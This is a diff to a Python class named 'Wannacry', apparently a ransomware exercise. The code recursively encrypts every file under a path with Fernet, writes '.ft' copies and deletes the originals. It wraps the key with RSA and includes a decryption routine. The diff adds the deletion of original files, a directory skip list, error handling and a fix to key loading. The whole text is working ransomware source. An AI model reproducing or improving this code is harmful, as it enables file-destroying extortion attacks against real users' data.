@@ -6,9 +6,8 @@ from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey, RSAPubl
 from crypto import encrypt_symmetric_key, generate_symmetric_key, generate_private_key, generate_public_key, load_symmetric_key, load_private_key, load_public_key, decrypt_symmetric_key
 from logger import log_info, log_title, log_error
 
-
 class Wannacry:
-    fernet: Fernet
+    fernet: Fernet = None
     private_key: RSAPrivateKey
     public_key: RSAPublicKey
 
@@ -23,16 +22,21 @@ class Wannacry:
     
     def encrypt(self, path: str):
         for root, dirs, files in os.walk(path, topdown=False):
+            if self.__ignore_dir__(root):
+                continue
             for name in files:
                 filename = os.path.join(root, name)
                 extension = os.path.splitext(filename)[1]
                 if extension == '.ft':
                     continue
                 self.__encrypt_file__(filename)
+                os.remove(filename)
         self.__to_hybrid_key__()
 
     def decrypt(self, path: str):
         for root, dirs, files in os.walk(path, topdown=False):
+            if self.__ignore_dir__(root):
+                continue
             for name in files:
                 filename = os.path.join(root, name)
                 extension = os.path.splitext(filename)[1]
@@ -40,28 +44,42 @@ class Wannacry:
                     continue
                 log_title(f'Decrypting: {filename}')
                 self.__decrypt_file__(filename)
+                os.remove(filename)
+
+    def __ignore_dir__(self, dir):
+        ignore_dirs = ['.local/bin', '.local/lib']
+        for ignore in ignore_dirs:
+            if ignore in dir:
+                return True
+        return False
 
     def __encrypt_file__(self, filename: str):
-        with open(filename, 'rb') as file:
-            token = self.fernet.encrypt(file.read())
-        new_filename = f'{filename}.ft'
-        with open(new_filename, 'wb') as nf:
-            nf.write(token)
-        log_info(key="Encrypted:" , message=filename)
+        try:
+            with open(filename, 'rb') as file:
+                token = self.fernet.encrypt(file.read())
+            new_filename = f'{filename}.ft'
+            with open(new_filename, 'wb') as nf:
+                nf.write(token)
+            log_info(key="Encrypted:" , message=filename)
+        except Exception as e:
+            log_error(e)
 
     def __decrypt_file__(self, filename: str):
-        original_filename = os.path.splitext(filename)[0]
-        with open(filename, 'rb') as file:
-            byte_data = self.fernet.decrypt(file.read())
-        new_filename = f'{original_filename}.rv'
-        with open(new_filename, 'wb') as nf:
-            nf.write(byte_data)
-        log_info(key="Decrypted:" , message=filename)
+        try:
+            original_filename = os.path.splitext(filename)[0]
+            with open(filename, 'rb') as file:
+                byte_data = self.fernet.decrypt(file.read())
+            new_filename = f'{original_filename}'
+            with open(new_filename, 'wb') as nf:
+                nf.write(byte_data)
+            log_info(key="Decrypted:" , message=filename)
+        except Exception as e:
+            log_error(e)
     
     def __load_key__(self):
         self.private_key = load_private_key()
         self.public_key = load_public_key()
-        if not self.public_key or self.private_key:
+        if not self.public_key or not self.private_key:
             return False
         self.fernet = self.__from_hybrid_key__()
 
